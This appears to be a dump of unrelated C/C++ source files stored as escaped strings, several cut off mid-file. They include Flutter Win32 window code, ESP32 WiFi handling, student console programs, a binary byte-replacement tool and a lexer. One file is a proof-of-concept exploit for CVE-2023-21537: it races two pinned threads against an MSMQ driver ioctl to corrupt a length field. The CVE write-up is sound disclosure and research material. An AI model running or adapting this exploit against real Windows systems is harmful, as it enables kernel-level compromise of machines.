window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"trackrinator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\n#include <EasyLogger.h>\n#include <WiFi.h>\n\n#include <vector>\n\n#define LABEL \"WIFI\"\n\nauto ssids = std::vector<String>();\nvoid setSsids(int count) {\n  ssids.clear();\n  for (int i = 0; i < count; i++) {\n    ssids.push_back(WiFi.SSID(i));\n  }\n}\nvoid onWifiEvent(WiFiEvent_t event) {\n  Serial.println(\"[WiFi-event] event: \" + event);\n  switch (event) {\n    case SYSTEM_EVENT_WIFI_READY:\n      Serial.println(\"WiFi interface ready\");\n      break;\n    case SYSTEM_EVENT_SCAN_DONE:\n      Serial.println(\"Completed scan for access points\");\n      break;\n    case SYSTEM_EVENT_STA_START:\n      Serial.println(\"WiFi client started\");\n      break;\n    case SYSTEM_EVENT_STA_STOP:\n      Serial.println(\"WiFi clients stopped\");\n      break;\n    case SYSTEM_EVENT_STA_CONNECTED:\n      Serial.println(\"Connected to access point\");\n      break;\n    case SYSTEM_EVENT_STA_DISCONNECTED:\n      Serial.println(\"Disconnected from WiFi access point\");\n      break;\n    case SYSTEM_EVENT_STA_AUTHMODE_CHANGE:\n      Serial.println(\"Authentication mode of access point has changed\");\n      break;\n    case SYSTEM_EVENT_STA_GOT_IP:\n      Serial.println(\"Obtained IP address: \" + WiFi.localIP());\n      break;\n    case SYSTEM_EVENT_STA_LOST_IP:\n      Serial.println(\"Lost IP address and IP address is reset to 0\");\n      //      vTaskDelay( 5000 );\n      //      ESP.restart();\n      break;\n    case SYSTEM_EVENT_STA_WPS_ER_SUCCESS:\n      Serial.println(\"WiFi Protected Setup (WPS): succeeded in enrollee mode\");\n      break;\n    case SYSTEM_EVENT_STA_WPS_ER_FAILED:\n      Serial.println(\"WiFi Protected Setup (WPS): failed in enrollee mode\");\n      //      ESP.restart();\n      break;\n    case SYSTEM_EVENT_STA_WPS_ER_TIMEOUT:\n      Serial.println(\"WiFi Protected Setup (WPS): timeout in enrollee mode\");\n      break;\n    case SYSTEM_EVENT_STA_WPS_ER_PIN:\n      Serial.println(\"WiFi Protected Setup (WPS): pin code in enrollee mode\");\n      break;\n    case SYSTEM_EVENT_AP_START:\n      Serial.println(\"WiFi access point started\");\n      break;\n    case SYSTEM_EVENT_AP_STOP:\n      Serial.println(\"WiFi access point  stopped\");\n      //      WiFi.mode( WIFI_OFF);\n      //      esp_sleep_enable_timer_wakeup( 1000000 * 2 ); // 1 second times how many seconds\n      //      wanted esp_deep_sleep_start();\n      break;\n    case SYSTEM_EVENT_AP_STACONNECTED:\n      Serial.println(\"Client connected\");\n      break;\n    case SYSTEM_EVENT_AP_STADISCONNECTED:\n      Serial.println(\"WiFi client disconnected\");\n      break;\n    case SYSTEM_EVENT_AP_STAIPASSIGNED:\n      Serial.println(\"Assigned IP address to client\");\n      break;\n    case SYSTEM_EVENT_AP_PROBEREQRECVED:\n      Serial.println(\"Received probe request\");\n      break;\n    case SYSTEM_EVENT_GOT_IP6:\n      Serial.println(\"IPv6 is preferred\");\n      break;\n    case SYSTEM_EVENT_ETH_GOT_IP:\n      Serial.println(\"Obtained IP address\");\n      break;\n    default:\n      break;\n  }\n}\n\nvoid initWifi() {\n  WiFi.onEvent(onWifiEvent);\n  // WiFi.disconnect(true);\n  // delay(100);\n}\n\nbool isWifiConnected() { return WiFi.isConnected(); }\n\nint getWifiStatus() { return WiFi.status(); }\n\nbool checkWifiScan() {\n  int result = WiFi.scanComplete();\n  if (result == WIFI_SCAN_RUNNING) {\n    return true;\n  }\n\n  if (result == WIFI_SCAN_FAILED || result < 0) {\n    LOG_ERROR(LABEL, \"Couldn't get networks: \" << result);\n    //  WiFi.scanNetworks(true);\n    //  handle\n    return false;\n  }\n\n  setSsids(result);\n\n  return false;\n}\n\nvoid scanNetworks() {\n  LOG_DEBUG(LABEL, \"Scanning\");\n  bool async = true;\n  int result = WiFi.scanNetworks(async);\n  if (result == WIFI_SCAN_FAILED) {\n    LOG_ERROR(LABEL, \"Failed to scan\");\n    //  handle\n  }\n\n  if (result >= 0) {\n    LOG_INFO(LABEL, \"Scan already finished\");\n    setSsids(result);\n  }\n}\n\nstd::vector<String>* getNetworks() { return &ssids; }\n\nvoid connectToWifi(const char* ssid, const char* password, bool connect) {\n  // if (!WiFi.mode(WIFI_STA)) {\n  //   //LOG_ERROR(LABEL, \"Failed to set wifi mode\");\n  //   return;\n  // }\n\n  if (WiFi.begin(ssid, password) == WL_CONNECT_FAILED) {\n    LOG_ERROR(LABEL, \"Failed to connect to wifi\");\n    return;\n  }\n\n  LOG_INFO(LABEL, \"Connecting to \" << ssid);\n  if (connect) {\n    auto last = millis();\n    while (!isWifiConnected()) {\n      delay(5);\n      if (millis() - last > 500) {\n        LOG_DEBUG(LABEL, \"WIFI status: \" << WiFi.status());\n        last = millis();\n      }\n      // Serial.print(\".\");\n    }\n    LOG_INFO(LABEL, \"Connected\");\n  }\n}\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nclass Registration\r\n{\r\nprivate:\r\n    string first_name;\r\n    string last_name;\r\n    int age;\r\n    string gender;\r\n\r\npublic:\r\n    void set(string first_name, string last_name, int age, string gender)\r\n    {\r\n        this->first_name = first_name;\r\n        this->last_name = last_name;\r\n        this->age = age;\r\n        this->gender = gender;\r\n    }\r\n\r\n    void get()\r\n    {\r\n        cout << \"Name = \" << first_name << \" \" << last_name << endl;\r\n        cout << \"Age = \" << age << endl;\r\n        cout << \"Gender = \" << gender << endl;\r\n    }\r\n};\r\n\r\nclass RoomAllocation\r\n{\r\npublic:\r\n    int cnt;\r\n    string type;\r\n    vector<int> room_num;\r\n\r\n    void set(int cnt, string type, vector<int> room_num)\r\n    {\r\n        this->cnt = cnt;\r\n        this->type = type;\r\n        this->room_num = room_num;\r\n    }\r\n\r\n    void get()\r\n    {\r\n        cout << type << \" :- \" << cnt;\r\n        if (cnt == 0)\r\n        {\r\n            cout << endl;\r\n            return;\r\n        }\r\n        cout << \" (Room number :- \";\r\n        for (auto i : room_num)\r\n        {\r\n            cout << i << \" \";\r\n        }\r\n        cout << \")\" << endl;\r\n    }\r\n};\r\n\r\nclass EnjoymentFeatures\r\n{\r\nprivate:\r\n    int ind;\r\n    string name;\r\n    int ct;\r\n\r\npublic:\r\n    void set(int ind, string name, int ct)\r\n    {\r\n        this->ind = ind;\r\n        this->name = name;\r\n        this->ct = ct;\r\n    }\r\n\r\n    void get()\r\n    {\r\n        cout << ind << \". \" << name << \"(Cost - Rs.\" << ct << \")\" << endl;\r\n    }\r\n};\r\n\r\nclass Food\r\n{\r\npublic:\r\n    int ind;\r\n    string name;\r\n    int ct;\r\n\r\n    void set(int ind, string name, int ct)\r\n    {\r\n        this->ind = ind;\r\n        this->name = name;\r\n        this->ct = ct;\r\n    }\r\n\r\n    void get()\r\n    {\r\n        cout << ind << \". \" << name << \"(Cost - Rs.\" << ct << \")\" << endl;\r\n    }\r\n};\r\n\r\nint dijkstra(vector<vector<int>> &vec, int ver, int edges, int src, int dest)\r\n{\r\n    unordered_map<int, list<pair<int, int>>> adj;\r\n    for (int i = 0; i < edges; i++)\r\n    {\r\n        int u = vec[i][0];\r\n        int v = vec[i][1];\r\n        int w = vec[i][2];\r\n\r\n        adj[u].push_back(make_pair(v, w));\r\n        adj[v].push_back(make_pair(u, w));\r\n    }\r\n\r\n    vector<int> dist(ver);\r\n\r\n    for (int i = 0; i < ver; i++)\r\n    {\r\n        dist[i] = INT_MAX;\r\n    }\r\n\r\n    set<pair<int, int>> st;\r\n\r\n    dist[src] = 0;\r\n    st.insert(make_pair(0, src));\r\n\r\n    while (!st.empty())\r\n    {\r\n        auto top = *st.begin();\r\n\r\n        int nodeDist = top.first;\r\n        int topNode = top.second;\r\n\r\n        st.erase(st.begin());\r\n\r\n        for (auto i : adj[topNode])\r\n        {\r\n            if (nodeDist + i.second < dist[i.first])\r\n            {\r\n                auto record = st.find(make_pair(dist[i.first], i.first));\r\n\r\n                if (record != st.end())\r\n                {\r\n                    st.erase(record);\r\n                }\r\n\r\n                dist[i.first] = nodeDist + i.second;\r\n                st.insert(make_pair(dist[i.first], i.first));\r\n            }\r\n        }\r\n    }\r\n\r\n    return dist[dest];\r\n}\r\n\r\nint main()\r\n{\r\n    int start;\r\n    cout << \"Let's start our day, press 1\" << endl;\r\n    cin >> start;\r\n\r\n    // when end become 0 we have to stop there else we want to continue then end = 1\r\n\r\n    while (1)\r\n    {\r\n        if (start == 0)\r\n        {\r\n            cout << \"It's break time now. \" << endl;\r\n            break;\r\n        }\r\n\r\n        // for calculating total cost\r\n        long long int cost = 0;\r\n\r\n        cout << \"Welcome to our resort, Sir/Mam.\" << endl;\r\n        cout << \"Now, you are in the resort's booking section, In the resort's booking section, provide all the needed information to book your stay now.\" << endl;\r\n\r\n        // User Registration and Authentication\r\n        cout << \"Your first name - \";\r\n        string led_first_name;\r\n        cin >> led_first_name;\r\n\r\n        cout << \"Your last name - \";\r\n        string led_last_name;\r\n        cin >> led_last_name;\r\n\r\n        cout << \"Your age - \";\r\n        int led_age;\r\n        cin >> led_age;\r\n\r\n        cout << \"Your gender - \";\r\n        string led_gender;\r\n        cin >> led_gender;\r\n\r\n        cout << \"Your email_id - \";\r\n        string led_email;\r\n        cin >> led_email;\r\n\r\n        cout << \"Your phone number - \";\r\n        string led_phone_num;\r\n        cin >> led_phone_num;\r\n\r\n        cout << \"number of people - \";\r\n        int total_people;\r\n        cin >> total_people;\r\n\r\n        cout << \"Please enter the details of all the people : -\" << endl;\r\n\r\n        Registration *all_detail = new Registration[total_people];\r\n\r\n        for (int i = 0; i < total_people; i++)\r\n        {\r\n            string fir_nm;\r\n            cout << \"Fisrt Name - \";\r\n            cin >> fir_nm;\r\n            string la_nm;\r\n            cout << \"Last Name - \";\r\n            cin >> la_nm;\r\n            int ag;\r\n            cout << \"Age - \";\r\n            cin >> ag;\r\n            string gen;\r\n            cout << \"Gender - \";\r\n            cin >> gen;\r\n\r\n            ",
    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nstruct Expense {\r\n    int id;\r\n    string category;\r\n    double amount;\r\n    string date;\r\n};\r\n\r\n// Global variables\r\nvector<Expense> expenses;\r\nint nextId = 1;\r\n\r\n// Function declarations\r\nvoid loadExpenses();\r\nvoid saveExpenses();\r\nvoid addExpense();\r\nvoid viewExpenses();\r\nvoid deleteExpense();\r\nvoid menu();\r\n\r\nint main() {\r\n    loadExpenses();\r\n    menu();\r\n    saveExpenses();\r\n    return 0;\r\n}\r\n\r\n// Load expenses from file\r\nvoid loadExpenses() {\r\n    ifstream file(\"expenses.txt\");\r\n    if (file.is_open()) {\r\n        Expense exp;\r\n        while (file >> exp.id >> exp.amount >> exp.date >> ws && getline(file, exp.category)) {\r\n            expenses.push_back(exp);\r\n            nextId = max(nextId, exp.id + 1);\r\n        }\r\n        file.close();\r\n    }\r\n}\r\n\r\n// Save expenses to file\r\nvoid saveExpenses() {\r\n    ofstream file(\"expenses.txt\");\r\n    if (file.is_open()) {\r\n        for (const auto &exp : expenses) {\r\n            file << exp.id << \" \" << exp.amount << \" \" << exp.date << \" \" << exp.category << endl;\r\n        }\r\n        file.close();\r\n    }\r\n}\r\n\r\n// Add a new expense\r\nvoid addExpense() {\r\n    Expense exp;\r\n    exp.id = nextId++;\r\n    cout << \"Enter category: \";\r\n    cin.ignore();\r\n    getline(cin, exp.category);\r\n    cout << \"Enter amount: \";\r\n    cin >> exp.amount;\r\n    cout << \"Enter date (YYYY-MM-DD): \";\r\n    cin >> exp.date;\r\n    expenses.push_back(exp);\r\n    cout << \"Expense added successfully!\\n\";\r\n}\r\n\r\n// View all expenses\r\nvoid viewExpenses() {\r\n    if (expenses.empty()) {\r\n        cout << \"No expenses to display.\\n\";\r\n        return;\r\n    }\r\n    cout << left << setw(5) << \"ID\" << setw(15) << \"Category\" << setw(10) << \"Amount\" << setw(12) << \"Date\" << endl;\r\n    cout << string(42, '-') << endl;\r\n    for (const auto &exp : expenses) {\r\n        cout << left << setw(5) << exp.id << setw(15) << exp.category << setw(10) << exp.amount << setw(12) << exp.date << endl;\r\n    }\r\n}\r\n\r\n// Delete an expense\r\nvoid deleteExpense() {\r\n    int id;\r\n    cout << \"Enter the ID of the expense to delete: \";\r\n    cin >> id;\r\n    auto it = find_if(expenses.begin(), expenses.end(), [id](const Expense &exp) { return exp.id == id; });\r\n    if (it != expenses.end()) {\r\n        expenses.erase(it);\r\n        cout << \"Expense deleted successfully!\\n\";\r\n    } else {\r\n        cout << \"Expense not found.\\n\";\r\n    }\r\n}\r\n\r\n// Menu for user interaction\r\nvoid menu() {\r\n    int choice;\r\n    do {\r\n        cout << \"\\nExpense Tracker Menu:\\n\";\r\n        cout << \"1. Add Expense\\n\";\r\n        cout << \"2. View Expenses\\n\";\r\n        cout << \"3. Delete Expense\\n\";\r\n        cout << \"4. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                addExpense();\r\n                break;\r\n            case 2:\r\n                viewExpenses();\r\n                break;\r\n            case 3:\r\n                deleteExpense();\r\n                break;\r\n            case 4:\r\n                cout << \"Exiting...\\n\";\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\\n\";\r\n        }\r\n    } while (choice != 4);\r\n}\r\n",
    "#include <algorithm>\n#include <cstdlib>\n#include <cstring>\n#include <fcntl.h>\n#include <iostream>\n#include <limits.h>\n#include <linux/fs.h>\n#include <string>\n#include <sys/ioctl.h>\n#include <sys/stat.h>\n#include <sys/sysinfo.h>\n#include <sys/types.h>\n#include <unistd.h>\n#include <vector>\n\n#define CODE_FAILURE -1\n#define USER_FAILURE -2\n#define MAX_MEMORY_PERCENT 60\n\nunsigned long long getTotalSystemMemory() {\n  struct sysinfo info;\n  if (sysinfo(&info) != 0) {\n    printf(\"Error getting system info\\n\");\n    exit(CODE_FAILURE);\n  }\n  return info.totalram * info.mem_unit;\n}\n\nstd::vector<uint8_t> str2hex(const std::string &text) {\n  std::vector<uint8_t> hexVec;\n  for (char c : text) {\n    uint8_t hex = static_cast<uint8_t>(c);\n    hexVec.push_back(hex);\n  }\n  return hexVec;\n}\n\nstd::string realPath(std::string filePath, bool beQuiet) {\n  char resolvedPath[PATH_MAX];\n  if (realpath(filePath.data(), resolvedPath) == nullptr) {\n    if (!beQuiet) {\n      std::cerr << \"Failed to resolve realpath for \" << filePath << std::endl;\n    }\n    exit(CODE_FAILURE);\n  }\n  return resolvedPath;\n}\n\nint replacebinary(std::string filePath, std::vector<std::string> replacements,\n                  bool beQuiet) {\n  ssize_t replacedCount = 0;\n  filePath = realPath(filePath, beQuiet);\n\n  struct stat sb;\n  int fd = open(filePath.data(), O_RDWR);\n  if (fd == -1) {\n    if (!beQuiet) {\n      std::cerr << \"Failed to open \" << filePath << std::endl;\n    }\n    return CODE_FAILURE;\n  }\n  if (lstat(filePath.data(), &sb) == -1) {\n    if (!beQuiet) {\n      std::cerr << \"Failed to lstat \" << filePath << std::endl;\n    }\n    close(fd);\n    return CODE_FAILURE;\n  }\n\n  bool isBlock = S_ISBLK(sb.st_mode);\n  bool isRegular = S_ISREG(sb.st_mode);\n  if (!isBlock && !isRegular) {\n    if (!beQuiet) {\n      std::cerr << \"Error: '\" << filePath\n                << \"' is neither a regular file nor a block device.\"\n                << std::endl;\n    }\n    return USER_FAILURE;\n  }\n  unsigned long long fdSize;\n  if (isBlock) {\n    if (ioctl(fd, BLKGETSIZE64, &fdSize) < 0) {\n      if (!beQuiet) {\n        std::cerr << \"Failed to get size of \" << filePath << std::endl;\n      }\n      close(fd);\n      return CODE_FAILURE;\n    }\n  } else {\n    fdSize = static_cast<unsigned long long>(sb.st_size);\n  }\n\n  auto it = std::max_element(replacements.begin(), replacements.end(),\n                             [](const std::string &a, const std::string &b) {\n                               return a.length() < b.length();\n                             });\n\n  if (fdSize < it->length()) {\n    if (!beQuiet) {\n      std::cerr << \"Invalid file size: \" << std::to_string(fdSize) << std::endl;\n    }\n    close(fd);\n    return CODE_FAILURE;\n  }\n\n  if (fdSize > getTotalSystemMemory() / 100 * MAX_MEMORY_PERCENT) {\n    if (!beQuiet) {\n      std::cout << \"Error: This file is too big to fit in your memory.\"\n                << std::endl;\n    }\n    return USER_FAILURE;\n  }\n\n  uint8_t *buffer = new uint8_t[fdSize];\n  if (buffer == nullptr) {\n    if (!beQuiet) {\n      std::cerr << \"Error: Failed to allocate memory for file contents.\"\n                << std::endl;\n    }\n    return CODE_FAILURE;\n  }\n\n  ssize_t bytesRead = 0;\n  ssize_t totalBytesRead = 0;\n  while ((bytesRead = read(\n              fd, buffer + totalBytesRead,\n              fdSize - static_cast<unsigned long long>(totalBytesRead))) > 0) {\n    totalBytesRead += bytesRead;\n  }\n  if (bytesRead == -1) {\n    if (!beQuiet) {\n      std::cerr << \"Failed to read \" << filePath << std::endl;\n    }\n    replacedCount = CODE_FAILURE;\n    goto done;\n  }\n\n  for (unsigned long i = 0; i < replacements.size(); i += 2) {\n    const std::vector<uint8_t> &from = str2hex(replacements[i]);\n    const std::vector<uint8_t> &to = str2hex(replacements[i + 1]);\n    if (from.size() != to.size()) {\n      std::cout << \"Invalid replacement.\" << std::endl;\n      continue;\n    }\n    ssize_t pos = 0;\n    while ((pos = std::search(buffer + pos, buffer + fdSize, from.begin(),\n                              from.end()) -\n                  buffer) != static_cast<long long>(fdSize)) {\n      if (lseek(fd, pos, SEEK_SET) == -1) {\n        if (!beQuiet) {\n          perror(\"lseek() failed\");\n        }\n        replacedCount = CODE_FAILURE;\n        goto done;\n      }\n      ssize_t bytesWritten = write(fd, to.data(), to.size());\n      if (bytesWritten == -1 ||\n          bytesWritten != static_cast<ssize_t>(to.size())) {\n        if (!beQuiet) {\n          perror(\"write() failed\");\n        }\n        replacedCount = CODE_FAILURE;\n        goto done;\n      }\n      pos += from.size();\n      ++replacedCount;\n    }\n  }\n\n  if (!beQuiet) {\n    std::cout << \"Replaced \" << replacedCount << \" occurrences.\" << std::endl;\n  }\n\ndone:\n  delete[] buffer;\n  close(fd);\n  return static_cast<int>(replacedCount);\n}\n\nvoid usage(char *executable) {\n  std::cout << \"    Usage: \" << executable\n            << \" [--quiet|-q] <filePath> <from|to> [from|to] ...\" << std::endl;\n  std::cout << \"    'from' and 'to' should have s",
    "\ufeff#include <windows.h>\n#include <stdio.h>\n#include <winternl.h>\n\n#include \"mq.h\"  \n#pragma comment (lib, \"Mqrt.lib\")\n#pragma comment (lib, \"Ntdll.lib\")\n#include \"tchar.h\"  \n\n#define ulong unsigned long\n\n__kernel_entry NTSTATUS NtDeviceIoControlFile(\n    HANDLE           FileHandle,\n    HANDLE           Event,\n    PIO_APC_ROUTINE  ApcRoutine,\n    PVOID            ApcContext,\n    PIO_STATUS_BLOCK IoStatusBlock,\n    ULONG            IoControlCode,\n    PVOID            InputBuffer,\n    ULONG            InputBufferLength,\n    PVOID            OutputBuffer,\n    ULONG            OutputBufferLength\n);\n\nHANDLE hQueue = NULL;\nBYTE* lpOutBuffer;\n// Output Buffer size\nDWORD nOutBufferSize = 704;\n__int64 arrayLen = 1;\n__int64* pArrayLen;\n\nvoid ThreadX0() {\n    ulong PrefProc = 0;\n    if (!SetThreadAffinityMask(GetCurrentThread(), (ulong)(1 << PrefProc)))\n    {\n        printf(\"Warning: Error setting affinity mask\\r\\n\");\n        return;\n    }\n    if (SetThreadIdealProcessor(GetCurrentThread(), PrefProc) == -1)\n    {\n        printf(\"Warning: Error setting ideal processor, Err: %X\\r\\n\", GetLastError());\n    }\n    struct _OVERLAPPED IoStatusBlock;\n    while (1) {\n        *pArrayLen = 1;\n        NTSTATUS status = NtDeviceIoControlFile(hQueue, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&IoStatusBlock,\n            0x19658107, NULL, 1, lpOutBuffer, nOutBufferSize);\n    }\n}\n\nvoid ThreadX1() {\n    ulong PrefProc = 1;\n    if (!SetThreadAffinityMask(GetCurrentThread(), (ulong)(1 << PrefProc)))\n    {\n        printf(\"Warning: Error setting affinity mask\\r\\n\");\n        return;\n    }\n    if (SetThreadIdealProcessor(GetCurrentThread(), PrefProc) == -1)\n    {\n        printf(\"Warning: Error setting ideal processor, Err: %X\\r\\n\", GetLastError());\n    }\n    while (1) {\n        *pArrayLen = 10000;\n    }\n}\n\nint main()\n{\n    printf(\"PoC of CVE-2023-21537!\\n\");\n\n    WCHAR wszFormatName[] = L\"DIRECT=OS:.\\\\Private$\\\\myQueue\";\n\n    // Call MQOpenQueue to open the queue with send access.  \n    HRESULT hr = MQOpenQueue(\n        wszFormatName,                     // Format name of the queue  \n        MQ_SEND_ACCESS,                    // Access mode  \n        MQ_DENY_NONE,                      // Share mode  \n        &hQueue                            // OUT: Queue handle  \n    );\n\n    // Handle any error returned by MQOpenQueue.  \n    if (FAILED(hr))\n    {\n        printf(\"MQOpenQueue failed\\n\");\n        return hr;\n    }\n    printf(\"MQOpenQueue succeed\\n\");\n    // Output Buffer\n    lpOutBuffer = (BYTE*)malloc(nOutBufferSize);\n    BYTE* pQueue = (BYTE*)malloc(0x40);\n    memset(lpOutBuffer, 0, nOutBufferSize);\n    memcpy(lpOutBuffer + 0x248, &pQueue, 8);\n\n    // Points to lenth, let's change it!\n    pArrayLen = (__int64*)(lpOutBuffer + 0x250);\n    *pArrayLen = 1;\n\n    ulong tid0 = 0;\n    HANDLE hThread0 = CreateThread(0, 0xA000, (LPTHREAD_START_ROUTINE)ThreadX0, 0, 0, &tid0);\n\n    ulong tid1 = 0;\n    HANDLE hThread1 = CreateThread(0, 0xA000, (LPTHREAD_START_ROUTINE)ThreadX1, 0, 0, &tid1);\n\n    Sleep(-1);\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\n\r\nstatic int Counter = 0 ;\r\nstatic string lookahead;\r\nvector<string> callLog;\r\n//DFAs\r\nclass DFA{\r\n    public:\r\n        DFA(){}\r\n       \r\n        enum class TokenType{\r\n            KEYWORD,\r\n            OPERATOR,\r\n            ERROR,\r\n            IDENTIFIER,\r\n            SYNTAX,\r\n            NUMBERS,\r\n        };\r\n\r\n        struct Token{\r\n            string value = \"\";\r\n            TokenType type;\r\n            int line = 0 ;\r\n            int WhichWord = 0 ;\r\n            int index;\r\n        };\r\n        \r\n        Token get_front_of_Token_list(){\r\n            return Tokens.front();\r\n        }\r\n\r\n        void erase_front_of_Token_list(){\r\n            Tokens.erase(Tokens.begin());\r\n        }\r\n\r\n        void add_to_Token_list(Token object){\r\n            this->Tokens.push_back(object);\r\n        }\r\n\r\n        void add_to_Error_Token_list(Token object){\r\n            this->ErrorTokens.push_back(object);\r\n        }\r\n\r\n        vector<Token> get_All_Token_list(){\r\n            return AllTokenList;\r\n        }\r\n\r\n        void Add_to_All_Token_list(Token object){\r\n            this->AllTokenList.push_back(object);\r\n        }\r\n        \r\n        vector<Token> get_Token_list(){\r\n            return Tokens;\r\n        }\r\n\r\n        vector<Token> get_Error_List(){\r\n            return ErrorTokens;\r\n        }\r\n\r\n        string FuncDefinition(const string& value) {\r\n            int state = 1;\r\n            string Token;\r\n            char letter;\r\n            int i = 0;\r\n            while (i < value.length()) {\r\n                letter = value[i];\r\n                switch (state) {\r\n                    case 1:\r\n                        if (letter == '$') {\r\n                            Token += letter;\r\n                            state = 2;\r\n                            i++;\r\n                        } else\r\n                            state = 13;\r\n                        break;\r\n                    case 2:\r\n                        if (letter == 's') {\r\n                            Token += letter;\r\n                            state = 3;\r\n                            i++;\r\n                        } else\r\n                            state = 13;\r\n                        break;\r\n                    case 3:\r\n                        if (letter == 'u') {\r\n                            Token += letter;\r\n                            state = 4;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 4:\r\n                        if (letter == 'b') {\r\n                            Token += letter;\r\n                            state = 5;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 5:\r\n                        if (letter == 'o') {\r\n                            Token += letter;\r\n                            state = 6;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 6:\r\n                        if (letter == 'r') {\r\n                            Token += letter;\r\n                            state = 7;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 7:\r\n                        if (letter == 'd') {\r\n                            Token += letter;\r\n                            state = 8;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 8:\r\n                        if (letter == 'i') {\r\n                            Token += letter;\r\n                            state = 9;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 9:\r\n                        if (letter == 'n') {\r\n                            Token += letter;\r\n                            state = 10;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 10:\r\n                        if (letter == 'a') {\r\n                            Token += letter;\r\n                            state = 11;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n                        break;\r\n                    case 11:\r\n                        if (letter == 't') {\r\n                            Token += letter;\r\n                            state = 12;\r\n                            i++;\r\n                        } else \r\n                            state = 13;\r\n  ",
    "/*\n *  Copyright (c) 2022 Ivo Dekker ACRO Diepenbeek KULeuven\n\n Permission is hereby granted, free of charge, to any person\n obtaining a copy of this software and associated documentation\n files (the \"Software\"), to deal in the Software without\n restriction, including without limitation the rights to use,\n copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the\n Software is furnished to do so, subject to the following\n conditions:\n\n The above copyright notice and this permission notice shall be\n included in all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n OTHER DEALINGS IN THE SOFTWARE.\n */\n\n\n#include 